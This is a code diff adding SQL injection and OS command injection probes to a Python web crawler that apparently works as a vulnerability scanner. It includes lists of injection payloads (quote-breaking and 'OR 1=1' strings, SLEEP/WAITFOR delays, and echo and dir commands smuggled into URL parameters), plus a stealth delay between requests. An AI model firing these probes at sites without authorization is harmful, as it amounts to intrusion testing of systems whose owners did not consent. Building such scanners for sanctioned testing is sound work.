@@ -3400,6 +3400,7 @@ def check_http_smuggling(base_url: str, domain: str) -> None:
 # ─────────────────────────────────────────────
 
 _waf_checked = set()
+_waf_results: dict = {}   # domain → detected vendor string (populated by detect_waf)
 
 # Signature sets: headers, cookie name prefixes, server header fragments, body snippets
 WAF_SIGNATURES = {
@@ -3543,6 +3544,7 @@ def detect_waf(base_url, domain):
             ev_str = ", ".join(dict.fromkeys(evidence))  # dedup, preserve order
             print(timestamp() + f" WAF detected on {domain}: {vendor} ({ev_str})")
             write_to_waf_database(domain, vendor, ev_str)
+            _waf_results[domain] = vendor   # cache for per-page injection checks
     else:
         print(timestamp() + f" No WAF detected on {domain}")
 
@@ -5517,6 +5519,10 @@ def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=
                 check_xxe_injection(url, html, headers)
                 # Prototype pollution — server-side body/query probes
                 check_prototype_pollution(url, html)
+                # SQL injection — error-based and time-based blind detection
+                check_sqli(url, html)
+                # Command injection — canary echo-based detection
+                check_cmdi(url, html)
             # IDOR candidate detection — runs in background thread with timeout
             # to prevent hung verification requests stalling the crawl
             _idor_thread = threading.Thread(
@@ -8365,6 +8371,342 @@ def scan_js_for_prototype_pollution_sinks(page_url: str, js_url: str, js_text: s
                 print(timestamp() + f" [!] PP client-side sink '{sink_label}': {js_url}")
                 # Report at most one finding per sink label per JS file
                 break
+
+
+# ─────────────────────────────────────────────
+# SQL Injection detection
+# ─────────────────────────────────────────────
+
+# Error-based detection strings — presence in response body confirms injection
+_SQLI_ERROR_STRINGS = [
+    "SQL syntax",
+    "mysql_fetch",
+    "ORA-01756",
+    "Microsoft OLE DB",
+    "ODBC SQL Server",
+    "PostgreSQL ERROR",
+    "Warning: pg_",
+    "SQLite3::",
+    "syntax error",
+    "unclosed quotation",
+    "quoted string not properly terminated",
+]
+
+# Error-based payloads (appended to each parameter value)
+_SQLI_ERROR_PAYLOADS = [
+    "'",
+    "''",
+    "`",
+    "')",
+    "'))",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    '" OR "1"="1',
+    ";--",
+]
+
+# Time-based (blind) payloads — flag HIGH if response time > 5 s
+_SQLI_TIME_PAYLOADS = [
+    "' OR SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
+]
+_SQLI_TIME_THRESHOLD = 5.0   # seconds
+
+# Static file extensions whose query params are not injection targets
+_SQLI_STATIC_RE = re.compile(
+    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|mp4|mp3|pdf|zip|gz|tar)(\?|$)',
+    re.IGNORECASE,
+)
+
+_sqli_tested: set  = set()   # (base_url, param) pairs already probed
+_sqli_domains: set = set()   # domains where SQLi was confirmed (stop testing)
+
+
+def check_sqli(page_url: str, html_content) -> None:
+    """
+    Error-based and time-based SQL injection detection.
+
+    Collects URL parameters from page links and GET-form action URLs, then
+    appends each payload to each parameter value.  Stops after the first
+    confirmed finding per domain (dedup + avoid hammering the server).
+
+    Only called when --active-probes is enabled.
+    Safe-mode only — no data extraction, schema dumping, or destructive payloads.
+    """
+    if not is_in_scope(page_url):
+        return
+    domain = urlparse(page_url).netloc
+    if is_third_party_cdn(domain):
+        return
+
+    try:
+        text = html_content if isinstance(html_content, str) \
+               else html_content.decode("utf-8", errors="ignore")
+        soup = BeautifulSoup(text, "lxml")
+    except Exception:
+        return
+
+    # Build candidate list: current page URL + linked hrefs + form actions
+    all_urls = [page_url]
+    for tag in soup.find_all(["a", "form"]):
+        href = tag.get("href") or tag.get("action") or ""
+        if href:
+            all_urls.append(href)
+
+    # Note WAF presence in findings if detected for this domain
+    waf_note = ""
+    waf_vendor = _waf_results.get(domain)
+    if waf_vendor:
+        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block, not a real injection]"
+
+    for raw_url in all_urls:
+        if domain in _sqli_domains:
+            break
+        try:
+            resolved = urljoin(page_url, raw_url)
+            parsed   = urlparse(resolved)
+            if is_third_party_cdn(parsed.netloc):
+                continue
+            if not parsed.query:
+                continue
+            # Skip static asset URLs
+            if _SQLI_STATIC_RE.search(parsed.path):
+                continue
+            base = parsed.scheme + "://" + parsed.netloc + parsed.path
+            params = {}
+            for pair in parsed.query.split("&"):
+                if "=" in pair:
+                    k, v = pair.split("=", 1)
+                    params[k] = v
+        except Exception:
+            continue
+
+        for param, orig_val in params.items():
+            if domain in _sqli_domains:
+                break
+            test_key = (base, param)
+            if test_key in _sqli_tested:
+                continue
+            _sqli_tested.add(test_key)
+
+            print(timestamp() + f" SQLi probe: {base} param={param}")
+
+            # ── Phase 1: error-based ─────────────────────────────────────────
+            for payload in _SQLI_ERROR_PAYLOADS:
+                if domain in _sqli_domains:
+                    break
+                new_query = "&".join(
+                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+                    for k, v in params.items()
+                )
+                test_url = base + "?" + new_query
+                try:
+                    stealth_delay(domain)
+                    resp = _get_session().get(
+                        test_url,
+                        headers=create_request_header(),
+                        timeout=10,
+                        allow_redirects=True,
+                    )
+                    body = (resp.text or "")
+                    for err_str in _SQLI_ERROR_STRINGS:
+                        if err_str.lower() in body.lower():
+                            snippet = body[max(0, body.lower().find(err_str.lower()) - 40):
+                                          body.lower().find(err_str.lower()) + 120].strip()
+                            alert(
+                                "SQL INJECTION (ERROR-BASED)",
+                                "CRITICAL",
+                                domain,
+                                f"Parameter '{param}' on {base} reflects SQL error '{err_str}' "
+                                f"with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
+                            )
+                            _sqli_domains.add(domain)
+                            break
+                except Exception:
+                    pass
+                if domain in _sqli_domains:
+                    break
+
+            if domain in _sqli_domains:
+                break
+
+            # ── Phase 2: time-based (blind) ──────────────────────────────────
+            for payload in _SQLI_TIME_PAYLOADS:
+                new_query = "&".join(
+                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+                    for k, v in params.items()
+                )
+                test_url = base + "?" + new_query
+                try:
+                    stealth_delay(domain)
+                    t0   = time.monotonic()
+                    resp = _get_session().get(
+                        test_url,
+                        headers=create_request_header(),
+                        timeout=10,
+                        allow_redirects=True,
+                    )
+                    elapsed = time.monotonic() - t0
+                    if elapsed >= _SQLI_TIME_THRESHOLD:
+                        alert(
+                            "SQL INJECTION (TIME-BASED BLIND CANDIDATE)",
+                            "HIGH",
+                            domain,
+                            f"Parameter '{param}' on {base} delayed {elapsed:.1f}s (>{_SQLI_TIME_THRESHOLD}s) "
+                            f"with time-based payload: {payload!r} — manual verification required{waf_note}",
+                        )
+                        break
+                except Exception:
+                    pass
+
+
+# ─────────────────────────────────────────────
+# Command Injection detection
+# ─────────────────────────────────────────────
+
+_CMDI_CANARY = "nuscrape-ci-canary"
+
+# Linux/Unix payloads
+_CMDI_UNIX_PAYLOADS = [
+    f";echo {_CMDI_CANARY}",
+    f"|echo {_CMDI_CANARY}",
+    f"`echo {_CMDI_CANARY}`",
+    f"$(echo {_CMDI_CANARY})",
+    f";echo${{IFS}}{_CMDI_CANARY}",
+    f"%0aecho%20{_CMDI_CANARY}",
+]
+
+# Windows payloads + detection strings
+_CMDI_WIN_PAYLOADS = [
+    f"&echo {_CMDI_CANARY}",
+    f"|echo {_CMDI_CANARY}",
+    ";dir",
+]
+_CMDI_WIN_INDICATORS = [
+    "Volume in drive",
+    "Directory of",
+    _CMDI_CANARY,
+]
+
+_cmdi_tested: set  = set()   # (base_url, param) already probed
+_cmdi_domains: set = set()   # domains where CMDi was confirmed
+
+
+def check_cmdi(page_url: str, html_content) -> None:
+    """
+    Canary-based OS command injection detection.
+
+    Injects harmless echo commands into every URL parameter found on the page.
+    Flags CRITICAL only when the literal canary string appears in the response —
+    proving the shell executed our input.
+
+    Only called when --active-probes is enabled.
+    Safe-mode only — no destructive commands, no reverse shells, no file reads.
+    """
+    if not is_in_scope(page_url):
+        return
+    domain = urlparse(page_url).netloc
+    if is_third_party_cdn(domain):
+        return
+
+    try:
+        text = html_content if isinstance(html_content, str) \
+               else html_content.decode("utf-8", errors="ignore")
+        soup = BeautifulSoup(text, "lxml")
+    except Exception:
+        return
+
+    all_urls = [page_url]
+    for tag in soup.find_all(["a", "form"]):
+        href = tag.get("href") or tag.get("action") or ""
+        if href:
+            all_urls.append(href)
+
+    waf_note = ""
+    waf_vendor = _waf_results.get(domain)
+    if waf_vendor:
+        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block]"
+
+    for raw_url in all_urls:
+        if domain in _cmdi_domains:
+            break
+        try:
+            resolved = urljoin(page_url, raw_url)
+            parsed   = urlparse(resolved)
+            if is_third_party_cdn(parsed.netloc):
+                continue
+            if not parsed.query:
+                continue
+            if _SQLI_STATIC_RE.search(parsed.path):   # reuse same static-file filter
+                continue
+            base = parsed.scheme + "://" + parsed.netloc + parsed.path
+            params = {}
+            for pair in parsed.query.split("&"):
+                if "=" in pair:
+                    k, v = pair.split("=", 1)
+                    params[k] = v
+        except Exception:
+            continue
+
+        for param, orig_val in params.items():
+            if domain in _cmdi_domains:
+                break
+            test_key = (base, param)
+            if test_key in _cmdi_tested:
+                continue
+            _cmdi_tested.add(test_key)
+
+            print(timestamp() + f" CMDi probe: {base} param={param}")
+
+            all_payloads = _CMDI_UNIX_PAYLOADS + _CMDI_WIN_PAYLOADS
+
+            for payload in all_payloads:
+                if domain in _cmdi_domains:
+                    break
+                new_query = "&".join(
+                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+                    for k, v in params.items()
+                )
+                test_url = base + "?" + new_query
+                try:
+                    stealth_delay(domain)
+                    resp = _get_session().get(
+                        test_url,
+                        headers=create_request_header(),
+                        timeout=10,
+                        allow_redirects=True,
+                    )
+                    body = resp.text or ""
+                    # Check for canary echo (Linux and Windows)
+                    if _CMDI_CANARY in body:
+                        idx = body.find(_CMDI_CANARY)
+                        snippet = body[max(0, idx - 30):idx + len(_CMDI_CANARY) + 60].strip()
+                        alert(
+                            "COMMAND INJECTION (CONFIRMED)",
+                            "CRITICAL",
+                            domain,
+                            f"Parameter '{param}' on {base} echoed canary string with "
+                            f"payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
+                        )
+                        _cmdi_domains.add(domain)
+                        break
+                    # Windows-specific indicators (no canary, but dir output seen)
+                    if payload in _CMDI_WIN_PAYLOADS:
+                        for win_str in _CMDI_WIN_INDICATORS:
+                            if win_str in body and win_str != _CMDI_CANARY:
+                                snippet = body[max(0, body.find(win_str) - 30):
+                                               body.find(win_str) + 120].strip()
+                                alert(
+                                    "COMMAND INJECTION (WINDOWS INDICATOR)",
+                                    "CRITICAL",
+                                    domain,
+                                    f"Parameter '{param}' on {base} returned Windows shell output "
+                                    f"'{win_str}' with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
+                                )
+                                _cmdi_domains.add(domain)
+                                break
+                except Exception:
+                    pass
 
 
 # ─────────────────────────────────────────────
